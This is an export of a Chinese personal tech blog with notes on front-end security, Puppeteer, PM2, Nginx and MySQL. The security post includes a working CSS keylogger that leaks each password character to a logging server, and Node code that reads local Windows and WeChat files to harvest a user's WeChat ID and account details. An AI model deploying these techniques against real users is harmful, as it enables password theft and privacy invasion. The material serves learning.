&#x27;test&#x27;; ctx.fillText(&#x27;test&#x27;, 10, 10) // 在10，10的位置绘制一个文本 console.log(canvas.toDataURL()) // 转base64 return md5(canvas.toDataURL()) // md5生成摘要&#125; 不同浏览器生成的base64是不同的 CSS键盘记录器 在React项目中设置密码框时，React会把输入的内容显示到input标签的value属性上。 前端： 12345678910111213141516&lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/react/16.13.1/umd/react.production.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/react-dom/16.13.1/umd/react-dom.production.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/babel-standalone/7.0.0-beta.3/babel.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/babel&quot;&gt; const Ipt = React.createElement(()=&gt;&#123; const &#123; useState &#125; = window.React; const [state,setState] = useState(&#123;val:&quot;123&quot;&#125;) const setInput = (e) =&gt; &#123; setState(&#123; val:e.target.value &#125;) &#125; return &lt;input type=&quot;password&quot; onChange=&#123;setInput&#125; value=&#123;state.val&#125;&gt;&lt;/input&gt; &#125;) ReactDOM.render(Ipt,document.getElementById(&#x27;app&#x27;)) &lt;/script&gt; 利用这一漏洞，可以使用css中的background-image标签，向某个接口发送请求，将用户输入的每一个字符发送给后端： 12345input[type=&quot;password&quot;][value$=&quot; &quot;] &#123; background-image: url(&quot;http://localhost:3000/+&quot;); &#125;input[type=&quot;password&quot;][value$=&quot;!&quot;] &#123; background-image: url(&quot;http://localhost:3000/%21&quot;); &#125;...input[type=&quot;password&quot;][value$=&quot;p&quot;] &#123; background-image: url(&quot;http://localhost:3000/p&quot;); &#125;... 上述代码利用属性选择器，将type=password且结尾为p的输入框选择出来，然后利用请求图像的方式向后端接口发送请求 这样后端就能够知道用户按了字符p 只要我们将所有字符都使用上述方式写一个选择器以及其对应的请求接口，就能获得用户的密码信息 后端实现： 12345678910const express = require(&quot;express&quot;);const app = express();// 使用通配符匹配任意一个按键app.get(&quot;/:key&quot;, (req, res) =&gt; &#123; process.stdout.write(req.params.key); return res.sendStatus(400);&#125;);app.listen(3000, () =&gt; console.log(&quot;&gt; Ready to keylog at localhost:3000&quot;)); 照片EXIF 前端可以使用库EXIF-js访问照片的隐私信息 1&lt;script src=&quot;https://cdn.jsdelivr.net/npm/exif-js&quot;&gt;&lt;/script&gt; 直接将图片和回调传如即可 12345const file = document.querySelector(&#x27;#img3&#x27;)EXIF.getData(file, function () &#123; const data = EXIF.pretty(this); console.log(data);&#125;) EXIF.getData(img, callback)获取图像的数据 EXIF.getTag(img, tag)获取图像的某个数据 EXIF.getAllTags(img)获取图像的全部数据，值以对象的方式返回 EXIF.pretty(img)获取图像的全部数据，值以字符串的方式返回 蜜罐技术 蜜罐技术即故意暴露一些设计好的漏洞，引诱黑客进行攻击，便于提供丰富的溯源数据，但蜜罐存在安全隐患，如果没有做好隔离，可能称为新的攻击源 使用蜜罐技术获取手机号与微信号 整个过程分为三步： 读取PFRO日志文件找出用户名 通过用户名找到对应的wxid 通过微信ID读取微信信息 12345678910111213141516171819202122232425// 读取PFRO文件fs.readFile(&#x27;C:/Windows/PFRO.log&#x27;, async (err, data) =&gt; &#123; const exp = /Users\\\\([^\\\\]*)/ig exp.test(data.toString(&#x27;utf16le&#x27;)) const userName = RegExp.$1 const wxId = await getWxId(userName) const info = await getData(userName, wxId) console.log(info);&#125;)// 获取微信IDconst getWxId = &lt;T&gt;(path: T) =&gt; &#123; const data = fs.readFileSync(`C:/Users/$&#123;path&#125;/Documents/WeChat Files/All Users/config/config.data`).toString(&#x27;utf8&#x27;) const reg = /Documents\\\\WeChat Files\\\\([^\\\\]*)/ig reg.test(data) return RegExp.$1&#125;//读取信息const getData = &lt;T&gt;(path: T, wxId: T) =&gt; &#123; const data = fs.readFileSync(`C:/Users/$&#123;path&#125;/Documents/WeChat Files/$&#123;wxId&#125;/config/AccInfo.dat`).toString(&#x27;utf-8&#x27;) return data&#125; 自动化UI测试（JS JS也有自己的自动化测试工具Puppeteer，他支持： 支持分布式爬取 实现了深度优先和广度优先算法 支持csv和json line格式导出 插件式的结果存储，比如支持redis 自动插入jquery，可以使用jquery语法进行结果处理 支持截图作为爬取证据 支持模拟不同的设备 并且带了 Chromium不用额外配置 安装： 12npm install pnpm -g //装过可以忽略pnpm add puppeteer 实现一个京东自动搜索，滚动加载，截图的功能： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import puppeteer from &quot;puppeteer&quot;//延迟函数const sleep = (time: number) =&gt; &#123; return new Promise((r, j) =&gt; &#123; setTimeout(() =&gt; &#123; r(time) &#125;, time) &#125;)&#125;(async () =&gt; &#123; //通过 launch 生成一个’浏览器‘实例, //option 中的 headless 是个布尔值，如果是 false 的话你就会看到一个浏览器从打开，到完成 //你整个任务的全过程， //默认是 true，也就是在后台自动完成你的任务 const browser = await puppeteer.launch(&#123; headless: false, defaultViewport: null, args: [&#x27;--start-maximized&#x27;] &#125;) //打开一个新的标签页 const page = await browser.newPage() //跳转到对应的页面 await page.goto(&#x27;https://jd.com&#x27;) //获取搜索框的元素 const key = await page.$(&#x27;#key&#x27;) //聚焦 await key?.focus() //搜索东西 await page.keyboard.sendCharacter(&#x27;iphone13&#x27;) //点击搜索按钮 await page.click(&#x27;.button&#x27;) //延迟一秒钟 await sleep(1000) //等待元素加载完成 await page.waitForSelector(&#x27;.gl-item&#x27;) //开始自动滚动为了截图全屏有数据 let scrollEnable: boolean = true; let scrollStep: number = 500 while (scrollEnable) &#123; scrollEnable = await page.evaluate((scrollStep: number) =&gt; &#123; let scrollTop: number = document.scrollingElement?.scrollTop ?? 0; document.scrollingElement!.scrollTop = scrollTop + scrollStep; return document.body.clientHeight &gt; scrollTop + 1080 ? true : false &#125;, scrollStep) //防止滚动过快 await sleep(500) &#125; //截图全屏 await page.screenshot(&#123;path:`iphone13.png`,fullPage:true&#125;)&#125;)() OSI网络模型 物理层 光纤、同轴电缆标准 数据链路层 将二级制数据分组，组成数据帧，数据帧中包含MAC地址，以广播方式传播 网络层 定义IP，通过网关进行逻辑寻址，实现不同网络之间的路径选择，主要协议：ICMP，IGMP，IP，ARP，RARP 传输层 定义传输数据的协议端口号，以及流量控制，差错校验，主要协议：TCP，UDP 会话层 建立，管理，终止会话 表示层 数据加密，压缩，处理ASCII，JPEG加密格式等等 应用层 HTTP协议、FTP协议，WS，SMTP协议 HTTP1.1和HTTP2 采用二进制格式而非文本格式 HTTP2是完全多路复用的，而非有序并阻塞的——只需要一个连接就能实现并行 使用报头压缩，降低了开销 HTTP2让服务器可以将响应主动推送到客户端缓存中","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"网络安全","slug":"前端/网络安全","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"网安","slug":"网安","permalink":"http://enderxiao.github.io/tags/%E7%BD%91%E5%AE%89/"}]},{"title":"Linux学习","slug":"Linux学习","date":"2024-01-22T06:46:10.000Z","updated":"2024-07-30T11:26:33.911Z","comments":true,"path":"2024/01/22/Linux学习/","permalink":"http://enderxiao.github.io/2024/01/22/Linux%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"NodeJS学习笔记","slug":"NodeJS学习笔记","date":"2024-01-21T12:07:30.000Z","updated":"2024-07-30T11:26:33.911Z","comments":true,"path":"2024/01/21/NodeJS学习笔记/","permalink":"http://enderxiao.github.io/2024/01/21/NodeJS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"NodeJS学习笔记","text":"NodeJS学习笔记 Node PM2 node的一款进程管理工具 特性 内置负载均衡（使用 Node Cluster集群模块） 后台运行 0秒停机重载 具有Ubuntu和CentOS启动脚本 停止不稳定进程 控制台检测 提供HTTP API 远程控制和实时的接口API 基本命令 当Node接口分别定义在很多个文件中，此时我们想要启动所有接口，则可以使用： 12npx pm2 start api.jsnpx pm2 start api2.js 启动多个接口文件，一旦运行过start命令，服务就会一只启用 可以使用npx pm2 list 查看已经启动的服务 使用： 1npx npm2 stop 0 即可停止某个服务，其中0代表服务在list中的id 使用 npx pm2 restart 0重启服务 npx pm2 delete 0将服务从list中删除 npx pm2 start api.js --watch用于监听文件的变得，自动重启服务 npx pm2 start api.js -i max用于监听文件的变得，自动重启服务，同时根据线程进行负载分配 npx pm2 start api.js --n aaa自定义服务的名称 npx pm2 monit查看服务运行状态（包含日志，堆占用等等信息） Nginx Nginx是一个高性能的HTTP和反向代理web服务器，同时提供IMAP/POP3/SMTP服务，支持5W个高并发。 前端主要使用Nginx搭建web服务器或进行反向代理解决跨域问题 底层由C语言编写 默认使用80端口 反向代理 正向代理 客户端由于某些原因无法访问一些服务器时，可以通过向代理服务器（VPN）发送请求，由代理服务器向目标站点发送请求后转发给客户端 反向代理 反向代理则是代理原本的服务器接收网络请求 他将请求转发给内部网络上的服务器，并将从服务器上得到的数据转发给客户端 通常会在具有服务器集群的项目中使用 负载均衡(upstream) 轮询 Nginx默认的负载均衡方式 请求按照时间顺序依次发给不同服务器 掉线的服务器会被自动剔除 权重 指定每个服务的的权重比例 权重和访问成正比 适用于服务器性能不统一的集群 动静分离 一般而言前端项目都需要进行动静分离，静态资源（HTML，JS，CSS，img等）都部署在Ngnix服务器上，如果是静态资源则可以迅速从Nginx上获得资源，而动态资源则通过Nginx反向代理向服务器发送请求获得，从而提升效率 常用命令 nginx启动 nginx -s stop停止 nginx -s quit等待请求处理完成后停止 nginx -s reload重载ngnix配置文件 nginx -t检查ngnix配置文件是否包含语法错误（同时返回配置文件地址 配置文件 全局块 user——指定可以运行ngnix服务的用户，用户组（windows上不生效 woker_process——指定ngnix进程数 pid——存放pid文件的目录 err_log logs/error.log——全局错误日志类型 debug info warn error存放地址 event块 accept_mutex——默认开启，开启后ngnix进程以串行处理请求，即一个请求只会唤醒一个经常。如果关闭会发生惊群效应，多个worker全部被唤醒但只有一个可以获取新连接 worker_connections单个进程最大连接数（=进程数+连接数）越大越好，但越大CPU占用越高 http块 include指令，用于引入其他的配置文件 default_type 如果Web程序没设置，Nginx也没对应文件的扩展名，就用Nginx 里默认的 default_type定义的处理方式。default_type application/octet-stream; #nginx默认文件类型 log_format指令，用于定义日志格式，此指令只能在http块中进行配置 sendfile 简单来说就是启用sendfile()系统调用来替换read()和write()调用，减少系统上下文切换从而提高性能，当 nginx 是静态文件服务器时，能极大提高nginx的性能表现 keepalive_timeout HTTP 有一个 KeepAlive 模式，它告诉 webserver 在处理完一个请求后保持这个 TCP 连接的打开状态。若接收到来自客户端的其它请求，服务端会利用这个未被关闭的连接，而不需要再建立一个连接。 gzip 开启Gzip压缩功能， 可以使网站的css、js 、xml、html 文件在传输时进行压缩，提高访问速度, 进而优化Nginx性能 server块 listen指令的配置非常灵活，可以单独制定ip，单独指定端口或者同时指定ip和端口 server_name nginx 允许一个虚拟主机有一个或多个名字，也可以使用通配符&quot;*&quot;来设置虚拟主机的名字 支持 ip 域名 通配符 正则等 location块 location 指令可以分为以下 3 类： 前缀字符串匹配 精确匹配 = 前缀匹配 ^~（立刻停止后续的正则搜索） 按文件中顺序的正则匹配 ~或~* 匹配不带任何修饰的前缀匹配。 正则表达式匹配 用于内部跳转的命名location location root——root 指定目录的上级目录，并且该上级目录要含有locatoin指定名称的同名目录 反向代理 配置方法 反向代理中的常用配置字段： 12proxy_passproxy_set_header proxy_pass该指令用来设置被代理服务器地址，可以是主机名称、IP地址加端口号形式。 proxy_set_header该指令可以更改Nginx服务器接收到的客户端请求的请求头信息，然后将新的请求头发送给代理的服务器 例如反向代理bilibili 12345location / &#123; root html; index index.html index.htm; proxy_pass http://bilibili.com;&#125; 反向代理解决跨域问题 利用反向代理的方法，借助Nginx向目标服务端发送请求来解决快于问题： 例如，我们有一个运行在9999端口上的服务端接口： 123456789101112131415const express = require(&#x27;express&#x27;) const app = express() app.get(&#x27;/portal/list&#x27;, (req, res) =&gt; &#123; res.json(&#123; code: 200, message: &quot;搞咩啊&quot; &#125;)&#125;) app.listen(9000,()=&gt;&#123; console.log(&#x27;success&#x27;);&#125;) 此时由于我们前端页面部署在Nginx服务器上，默认地址为80，那么我们前端页面通过HTTPRequest向后端9999端口请求时，由于端口号不同，则直接访问会报跨域错误： 123456789101112131415161718192021&lt;html&gt; &lt;body&gt; &lt;a id=&quot;a&quot;&gt;&lt;/a&gt; &lt;/body&gt;&lt;/html&gt;&lt;script&gt; const a = document.getElementById(&quot;a&quot;) a.onclick = () =&gt; &#123; let xhr = new XMLHttpRequest() xhr.open(&#x27;GET&#x27;,&#x27;/api/portal/list&#x27;) xhr.onreadystatechange = () =&gt; &#123; if(xhr.readyState == 4 &amp;&amp; xhr.status == 200)&#123; console.log(xhr.responseText); &#125; &#125; xhr.send(null) &#125;&lt;/script&gt; 配置新的location来让其根据特殊的PAI进行替换 12345678location /api/ &#123; proxy_pass http://localhost:9000/; # 反向代理到目标服务器url&#125;location / &#123; root html; index index.html index.htm; proxy_pass http://bilibili.com;&#125; 截取到/api/ 将会转发到 http://localhost:9000/ Vue histroy 模式 跳转路由404 问题 当我们把vue项目打包好放到nginx上并部署时，服务器是根据页面路由，去按路径寻找资源的，而打包好的web站点只有一个html页面，不存在其他资源目录下的html，服务器找不到对应页面所以才报404。 此时我们可以在location /中添加配置来讲不同的vue路由重新映射到跟路径指定的html上： 12345location / &#123; root html; index index.html index.htm; try_files $uri $uri/ /index.html;&#125; 如果给出的file都没有匹配到，则重新请求最后一个参数给定的uri，就是新的location匹配 常见的变量： $uri 指当前的请求URI，不包括任何参数，反映任何内部重定向或index模块所做的修改 $args 当前请求的参数，即“？”后的宇符串 $arg_xxx 当前请求里的某个参数，“arg ”后是参数的名字 $http_xxx 当前请求里的 xxx 头部对应的值 $sent_http_xxx 返回给客户端的响应头部对应的值 $remote_addr 客户端IP 地址。 $http_cookie 获取cookie值 $cookie_xxx 当前请求的cookie xxx对应的值 $request_uri 浏览器发起的不作任何修改的请求的url中的path 如在www.baidu.com/p1/file?d=111, 其值为/p1/file?d=111 $request_method 请求方法 GoAccess GoAccess是一款开源、实时，运行在命令行终端下的web日志分析工具。该工具提供快速、多样的HTTP状态统计，可以令管理员不再纠结于统计各类数据，和繁杂的指令以及一大堆管道/正则表达式说byebye 底层使用C编写 Linux下安装： 123456wget http://tar.goaccess.io/goaccess-1.2.tar.gztar -xzvf goaccess-1.2.tar.gzcd goaccess-1.2/./configure makemake install 然后切换到nginx目录下的log文件夹中，可以看到access.log文件即为nginx的日志文件。 除了格式化的命令行显示外，还支持生成HTML页面，但这一功能需要窝门手动的在Nginx服务器上创建html文件作为容器： 在Nginx目录中的html目录下创建report.html后 开启实时HTML报告分析（webSocket） 1goaccess access.log -a -o ../html/report.html --real-time-html --log-format=COMBINED upstream负载均衡配置 upstream字段属于http的子字段，与server字段平级 一个upstream需要设置一个名称，这个名称可以在server里面当作proxy主机使用 1234567891011121314http: &#123; upstream node &#123; # 使用不同端口启动的服务来模拟多服务器 server 127.0.0.1:9001; server 127.0.0.1:9002; server 127.0.0.1:9003; &#125; server &#123; # 此时需要把反向代理配置为负载均衡的名称 location / &#123; proxy_pass http://node; &#125; &#125;&#125; API代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354const express = require(&#x27;express&#x27;)var num = 1const app = express() app.get(&#x27;/list&#x27;,(req,res)=&gt;&#123; res.json(&#123; code:200, message:&quot;Nginx 负载均衡9001&quot; &#125;) console.log(&quot;Nginx 负载均衡9001&quot;,num) // 写日志 num++ // 统计访问次数&#125;)//------------------------------9001app.listen(9001,()=&gt;&#123; console.log(&#x27;9001 success&#x27;)&#125;) //-----------------------------------const express = require(&#x27;express&#x27;)var num = 1const app = express() app.get(&#x27;/list&#x27;,(req,res)=&gt;&#123; res.json(&#123; code:200, message:&quot;Nginx 负载均衡9002&quot; &#125;) console.log(&quot;Nginx 负载均衡9002&quot;,num) num++&#125;)//------------------------------9002app.listen(9002,()=&gt;&#123; console.log(&#x27;9002 success&#x27;)&#125;) //-------------------------------- const express = require(&#x27;express&#x27;)var num = 1const app = express() app.get(&#x27;/list&#x27;,(req,res)=&gt;&#123; res.json(&#123; code:200, message:&quot;Nginx 负载均衡9003&quot; &#125;) console.log(&quot;Nginx 负载均衡9003&quot;,num) num++&#125;)//------------------------------9003app.listen(9003,()=&gt;&#123; console.log(&#x27;9003 success&#x27;)&#125;) 默认状态下使用轮询的方式进行负载均衡，可以使用postman对接口进行压力测试，使用PM2启动三个后端服务后，查看PM2的日志可以发现三个接口的访问次数时相同的。 权重并发 当服务器性能不同时可能需要按照权重来进行负载均衡，此时通过为每个服务器设置权重值来开启： 1234567891011121314http: &#123; upstream node &#123; # 使用不同端口启动的服务来模拟多服务器 server 127.0.0.1:9001 weight=3; server 127.0.0.1:9002 weight=2; server 127.0.0.1:9003 weight=1; &#125; server &#123; # 此时需要把反向代理配置为负载均衡的名称 location / &#123; proxy_pass http://node; &#125; &#125;&#125; 权重越大服务器承载的并发就越高 压力测试结束后可以看到9001端口的访问次数最大，9002其次，9003最少 备用服务器 backup是备用服务器参数，可以为一个upstream设置一个backup的server，在生产server全部都出问题之后，可以自动切换到备用server上，为回复服务争取时间，该功能通过设置fail_timeout字段设置容忍时间，backup字段设置备用服务器： 1234567891011121314http: &#123; upstream node &#123; # 使用不同端口启动的服务来模拟多服务器 server 127.0.0.1:9001 fail_timeout=60; server 127.0.0.1:9002 fail_timeout=20; server 127.0.0.1:9003 backup; &#125; server &#123; # 此时需要把反向代理配置为负载均衡的名称 location / &#123; proxy_pass http://node; &#125; &#125;&#125; 从PM2日志可以观察到网络正常的情况下9001端口和9002端口的服务访问次数相同，9003没有被访问过","categories":[{"name":"后端","slug":"后端","permalink":"http://enderxiao.github.io/categories/%E5%90%8E%E7%AB%AF/"},{"name":"NodeJS","slug":"后端/NodeJS","permalink":"http://enderxiao.github.io/categories/%E5%90%8E%E7%AB%AF/NodeJS/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"后端框架","slug":"后端框架","permalink":"http://enderxiao.github.io/tags/%E5%90%8E%E7%AB%AF%E6%A1%86%E6%9E%B6/"},{"name":"Node","slug":"Node","permalink":"http://enderxiao.github.io/tags/Node/"}]},{"title":"MySQL学习","slug":"MySQL学习","date":"2023-11-26T09:00:11.000Z","updated":"2024-07-30T11:26:33.911Z","comments":true,"path":"2023/11/26/MySQL学习/","permalink":"http://enderxiao.github.io/2023/11/26/MySQL%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"数据库概述 名称 全称 简称 数据库 存储数据的仓库，数据有组织的进行存储 DataBase 数据库管理系统 操纵和管理数据库的大型系统 DBMS(DataBase Management System) SQL 关系型数据库操作语言，定义了一套操作关系型数据库统一标准 SQL(Structed Query Language) SQL操作数据库管理系统，从而实现对数据库中的数据进行操作 MySQL安装 MySQL默认端口号为3306 MySQL在windows下的默认系统服务名称为mysql80 MySQL连接命令 1mysql [-h 127.0.0.1] [-P 3306] -u root -p 事物 数据库事务 事务是一个逻辑单元需要执行的一系列操作，使得数据从一种状态变为另一种 处理原则： 所有操作都被提交，使得数据被永久修改 所有操作都被放弃，数据回滚到初始状态 事物具有四大特性（ACID）： 原子性A 一致性C 隔离性I 持久性D 123456789101112--开启事务,手动开启的事务需要手动提交START TRANSACTIONBEGIN--查看事务提交方式，1为自动提交，0为手动提交SELECT @@AUTOCOMMITESET @@AUTOCOMMITE = 0--提交/回滚事务COMMITROLLBACK MySQL中的事务默认为自动提交 数据库四大特性ACID 原子性（Automicity） 事务是一个不可分割的原子工作单元，要么全被执行，要么全被拒绝 由undo log (回滚日志)保证 一致性（consistency） 事务执行后，数据由一个合法状态转换为另一个合法状态 隔离性（isolation） 并发事务对数据的修改对于其它并发事务而言是隔离的，不被其他事务干扰 由MVCC（多版本并发控制）或锁机制保证 持久性（durability） 事务一旦被提交，其对数据库中数据的修改时永久性的，接下来其他操作以及数据库故障不应对其有任何影响 由redo log (重做日志)保证 事务状态 事务总共包含5个状态： 活动的(activie)：事务对应的数据库操作正在执行过程中 部分提交的(partially committed)：活动的事务的最后一个操作完成，由于操作均发生在内存中，造成的影响并未刷新到硬盘中去 失败的(failed)：活动的事务或部分提交的事务遇到错误（数据库自身报错，操作系统报错，断电），或手动中止而无法执行时，停止当前事务的执行 提交的（committed）：当处于部分提交状态的事务将修改过的数据都同步到磁盘上时，该事务处于提交状态 中止的（aborted）：当处于失败状态的事务把已经修改过的事务中的操作还原到事务执行之前的状态，撤销失败任务对当前数据库造成的影响，即回滚完成后事务所处的状态 并行事务引起的问题 为什么： MySQL服务端允许同时连接多个客户端，这意味着MySQL会同时处理多个事务 引起的问题： 脏读：一个事务中读到其他事务还未提交的数据 不可重复读：一个事务中前后两次读取的数据不一致，不可重复读的重点是update和delete，同样的条件，读取过的数据，再次读取出来发现值不一样 幻读：一个事务前后读取的数据数量不一致，例如： 事务1对表的Primary key=n进行查询，若查询结果为无，则增加一条key为n的数据 同时，第二个事务直接向表中插入一条key=n的数据，并提交 那么，如果不可重复读问题被结果，则事务1的查询结果仍未无，事务1执行插入操作时会发生主键重复错误 问题严重程度： 脏读 &gt; 不可重复读 &gt; 幻读 为什么加锁不能解决幻读 因为InnoDB是加的行锁，行锁无法锁住之前事务中没有存在的行。 事务隔离级别 SQL标准提出了四种隔离级来避免上述问题，隔离级别越高，效率越低 读未提交：最低级隔离，在这一隔离级别下，三种问题都可能出现，但性能最高 指一个事务还没提交时，它做的变更就能被其他事务看到； 读提交：Oracle默认事务隔离级别，这一隔离级别下不会出现脏读问题 指一个事务提交之后，它做的变更才能被其他事务看到； 可重复读：MySQL默认事务隔离级别，这一隔离级别下不会出现脏读，不可重复读问题 指一个事务执行过程中看到的数据，一直跟这个事务启动时看到的数据是一致的，MySQL InnoDB 引擎的默认隔离级别； 串行化：这一隔离级别下，三种问题都不会出现，但性能最低 实现机制：所有的读操作均为当前读，读加读锁 (S锁)，写加写锁 (X锁)。 Serializable隔离级别下，读写冲突，因此并发度急剧下降，在MySQL/InnoDB下不建议使用。 会对记录加上读写锁，在多个事务对这条记录进行读写操作时，如果发生了读写冲突的时候，后访问的事务必须等前一个事务执行完成，才能继续执行； 隔离级别 脏读 不可重复读 幻读 Read Uncommitted √ √ √ Read Committed × √ √ Repeatable Read × × √ Serializable × × × 12345--查看事务隔离级别SELECT @@TRANSACTION_ISOLATION--设置事务隔离级别SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL &#123;READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE&#125; 隔离级别实现 读未提交：直接读取最新数据 读已提交，可重复读：通过Read View实现，Read View可理解为一个快照 读已提交在每个操作执行之前生成一个Read View 可重复读在开启事务时创建一个Read View，整个事务期间使用同一个Read View 串行化：通过加读写锁实现 注意，执行「开始事务」命令，并不意味着启动了事务。在 MySQL 有两种开启事务的命令，分别是： 第一种：begin/start transaction 命令； 第二种：start transaction with consistent snapshot 命令； 这两种开启事务的命令，事务的启动时机是不同的： 执行了 begin/start transaction 命令后，并不代表事务启动了。只有在执行这个命令后，执行了第一条 select 语句，才是事务真正启动的时机； 执行了 start transaction with consistent snapshot 命令，就会马上启动事务。 Read View在MVCC中如何工作 MVCC是什么 MVCC-多版本并发控制，为了提高数据库读写效率，在有效解决读写冲突的同时，不用对数据加锁阻塞读写操作提高数据库并发读写性能 可以有效解决脏读、不可重复读、幻读等隔离问题，但不能解决更新丢失问题 MVCC的核心 undo log insert undo log 代表事务中insert数据而产生的undo log，只有事务回滚的时候需要，事务提交后即可被清除 update undo log 代表事务中update或delete时产生的undo log，不仅事务回滚时需要，快照读时也同样需要，不能随便删除，只有在快照读或事件回滚不涉及该日志时，才会被purge线程统一清除 ReadView 当前读和快照读 在RR隔离等级中，select为通过MVCC实现的快照读，即不会加锁 在RR隔离等级中，select ... for update则是当前读，会为访问的数据加上next-key lock锁 ReadView ReadView中包含四个字段 聚簇索引（主键索引）记录中两个跟事务有关的隐藏列 四字段 m_ids：创建ReadView时，数据库中“活跃且未提交”的事务id列表 min_trx_id：创建ReadView时，当前数据库中“活跃且未提交”的事务id中的最小值，即m_ids中的最小值 max_trx_id：创建ReadView时，当前数据库中应该给下一个事务的id值，即最大事务id+1 creator_trx_id：创建该ReadView的事务的事务id 聚簇索引记录隐藏字段 DB_TRX_ID：存储最近一次对聚簇索引记录进行修改的事务ID DB_ROLL_PTR：每当事务对聚簇索引进行修改时，旧版本会被记录在undo log中，该字段指向undo log中的该聚簇索引记录的旧版本记录 实际上聚簇索引还有另一个隐藏字段DB_ROW_ID：隐藏自增ID，如果数据没有主键，InnoDB会自动以DB_ROW_ID产生一个聚簇索引 一个事务去访问记录id为db_trx_id的记录时，除了自己的更新记录总是可见的以外，还需经过以下判断： if(db_trx_id &lt; min_trx_id)则说明在当前事务创建ReadView之前，该事务已经提交，因此记录为可见 if(db_trx_id &gt;= max_trx_id)则说明当前事务创建ReadView之后，该事务才创建，还未提交，因此记录为不可见，则沿记录的DB_ROLL_PTR查找旧版本的记录，直到记录为可见为止 if(db_trx_id &gt;= min_trx_id &amp;&amp; db_trx_id &lt; max_trx_id) if(m_ids.contains(db_trx_id))则说明当前事务创建ReadView时，该事务仍处于活跃状态（未提交），因此记录为不可见则沿记录的DB_ROLL_PTR查找旧版本的记录，直到记录为可见为止 else则说明当前事务创建ReadView时，该事务已经提交，因此记录为可见 这种通过版本链来控制并发事务访问同一记录时的行为就叫MVCC 可重复读是如何实现的 可重复读（RR）指一个事务的处理过程中看到的数据，一直和事务启动时看到的相同 实现原理：开启一个事物时即创建了一个ReadView，整个事物的过程中都使用这一个ReadView 读提交时如何实现的 读提交（RC）指一个事务只有提交后他对数据的修改才能被其他事务看见 实现原理：在事务的每次读取操作开始前生成一个新的ReadView RR模式能解决幻读问题吗 虽然MySQL InnoDB的默认隔离等级RR是可重复读级别，但也可以在很大程度上避免幻读 针对快照读，通过MVCC方式解决了幻读，其他事务插入的事务在当前事务中是不可见的 针对当前读，通过next-key lock锁的方式解决了幻读，在执行select... for update时会加上next-key lock锁，其他事务在next-key lock范围内插入数据会被阻塞 幻读（Phantom Read）：同一个事物中同一查询在不同时间产生了不同结果集（不同行数） 快照都的解决方案： RR模式下的快照读，由于在事物开始时就创建了ReadView，即使过程中有其他事物插入了新事物，当前事务的ReadView没变，因此不会产生幻读 当前都的解决方案： 使用next-key lock（间隙锁+记忆锁）实现 当前事务进行select...for update时，会对查询的范围加上next-key lock 在此期间，其他事务想向next-key lock范围内插入新的数据时，会生成一个意向锁，进入等待状态，直到上锁事务提交 但RR并不能完全解决幻读的问题： 场景一 事务A创建事务，执行查询操作，查询id=5的数据（为空） 事务B创建事务，执行插入操作，插入id=5的数据（将数据的DB_TRX_ID设为Bid） 事务B提交 事务A更新id=5的数据（进行当前读，获取最新数据，并将数据的DB_TRX_ID设为Aid） 事务A执行查询id=5（此时由于DB_TRX_ID与自身相同，认为数据可以查看，结果能够查询到id=5的数据） 场景二 事务A创建事务，执行查询操作，查询id=5的数据（为空） 事物B创建事物，执行插入操作，插入id=5的数据（将数据的DB_TRX_ID设为Bid） 事物B提交 事物A使用select...for update触发当前读，获取最新数据。结果能够查询到id=5的数据 因此如果想要尽量避免触发这种特殊情况，尽量在开启事务后立即进行select...for update操作，为数据上next-key lock锁，从而阻塞其他事务的插入操作 索引 定义 帮助MySQL高效获取数据的数据结构 索引分类 按数据结构分：B+树索引，Hash索引，Full-Text索引 按物理结构分：聚簇索引（主键索引），二级索引（辅助索引） 按字段特性分：主键索引，唯一索引，普通索引，前缀索引 按字段个数分：单列索引，联合索引 按数据结构分 MySQL常见存储引擎对索引的支持： 索引类型 InnoDB MyISAM Memory B+树索引 Yes Yes Yes Hash索引 No（不支持但内存结构中有一个自适应hash索引） No Yes Full-Text索引 Yes（MySQL5.6之后） Yes No B+Tree是MySQL存储引擎采用最多的索引类型。 创建表时InnoDB根据不同场景选择不同的列作为索引： 如果有主键，则使用主键作为聚簇索引的索引键 如果没有，则选择第一个不包含Null值的唯一列作为聚簇索引的索引键 以上两个都不满足，则会使用隐含的自增id列作为聚簇索引的索引键 其余索引都属于辅助索引（二级索引，非聚簇索引），创建的主键索引和二级索引默认使用B+Tree索引 B+Tree 是一种多叉树，叶子节点才存放数据，非叶子节点只存放索引，而且每个节点里的数据是按主键顺序存放的。每一层父节点的索引值都会出现在下层子节点的索引值中，因此在叶子节点中，包括了所有的索引值信息，并且每一个叶子节点都有两个指针，分别指向下一个叶子节点和上一个叶子节点，形成一个双向链表。 主键索引和辅助索引的区别 B+tree中主键索引和辅助索引区别如下 主键索引的B+tree中，叶子节点存储的是实际数据 辅助索引的B+tree中，叶子节点存储的是主键值 回表：使用辅助索引查询数据时，先查询辅助索引B+tree得到主键后在通过查询主键B+tree来得到数据的过程称为回表 覆盖索引：使用辅助索引查询主键时，可直接在辅助索引B+tree中查到，则不需要再查询主键B+tree，这个过程称为覆盖索引 为什么使用B+树 B+Tree VS BTree 单节点数据量小：B+树非叶子节点并没有指向关键字具体信息的指针，内部节点更小，能够一次读入内存的量更多，减小了IO消耗 查询更稳定：只有叶子节点包含数据，因此任何查询都要走到叶子节点，而叶子节点位于同一层，因此每个查询效率相当 便与扫库：数据均为叶子节点连接的双向链表中，只需扫一遍叶子节点即可 B+ Tree VS 二叉树 